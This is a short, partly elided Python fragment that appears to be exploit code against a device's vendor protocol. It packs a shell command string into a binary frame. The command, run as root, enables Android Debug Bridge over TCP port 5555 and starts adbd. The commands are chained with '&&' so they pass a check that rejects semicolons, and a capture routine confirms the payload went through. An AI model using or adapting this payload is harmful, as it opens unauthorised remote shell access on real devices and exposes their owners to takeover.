...
GET_INFO = 0x0101
SEND_INFO = 0x0102
START_ADBD = b'test "$(id -u)" = 0 && setprop service.adb.tcp.port 5555 && setprop ctl.start adbd'
...
def query_frame(source, target):
    ...
    if len(START_ADBD) >= 200 or b';' in START_ADBD:
        raise ValueError('Vendor command buffer limit')
    payload = struct.pack('!BH', 1, len(START_ADBD)) + START_ADBD + b'\0'
    body = struct.pack('!HI8sH', 0x0301, 2, bytes(8), len(payload)) + payload
...
def capture_query(adapter, source, target, output):
    ...
    try:
        ...
        if frame[18:20] != b'\x03\x01' or frame[37:37 + len(START_ADBD)] != START_ADBD:
            raise RuntimeError('Fixed recovery command gate failed')
